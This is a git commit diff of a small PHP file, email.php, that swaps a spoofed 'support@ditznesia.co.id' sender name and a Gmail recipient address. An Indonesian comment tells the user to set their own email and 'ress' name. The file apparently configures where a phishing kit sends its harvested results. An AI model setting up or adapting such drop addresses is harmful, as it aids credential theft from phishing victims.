209373c851e6dfb9b80d571dadf0574fdd6063ae
anjasganteng <102732642+anjasganteng@users.noreply.github.com>
2022-06-04 12:54:54 +0700

    Update email.php
    Sjs

--- email.php
+++ email.php
@@ -2,8 +2,8 @@
 
 /* JANGAN LUPA GANTI EMAILMU & NAMA RESS MU */
 
-$sender = 'From: web hanz <support@ditznesia.co.id>';
+$sender = 'From: AnjasMaraXD <support@ditznesia.co.id>';
 
-$emailku = 'tiktoknebar291@gmail.com';
+$emailku = 'panelokep@gmail.com';
 
 ?>
